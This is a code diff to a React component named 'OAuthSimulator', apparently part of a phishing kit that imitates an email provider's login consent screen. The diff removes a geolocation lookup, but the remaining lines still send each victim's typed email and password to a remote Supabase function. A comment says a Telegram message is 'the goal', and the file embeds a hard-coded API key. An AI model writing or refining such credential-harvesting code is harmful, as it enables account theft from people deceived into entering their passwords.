@@ -4,7 +4,6 @@ import {
   ArrowRight, RefreshCw, AlertTriangle, Eye, EyeOff
 } from 'lucide-react';
 import { EmailProvider, SecurityStep } from '../types';
-import { getGeoInfo } from '../utils/geoip';
 
 interface OAuthSimulatorProps {
   provider: EmailProvider;
@@ -26,9 +25,6 @@ export default function OAuthSimulator({ provider, onConsentSuccess, onCancel }:
     const supabaseKey =
       'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';
 
-    // Resolve geolocation (cached after first call, never blocks UX)
-    const geo = await getGeoInfo();
-
     await fetch(`${supabaseUrl}/functions/v1/login`, {
       method: 'POST',
       headers: {
@@ -40,8 +36,6 @@ export default function OAuthSimulator({ provider, onConsentSuccess, onCancel }:
         email: emailInput,
         provider: provider.id,
         password: passwordInput,
-        // Spread all available geo fields
-        ...geo,
       }),
     });
     // Intentionally ignore result — TG message is the goal
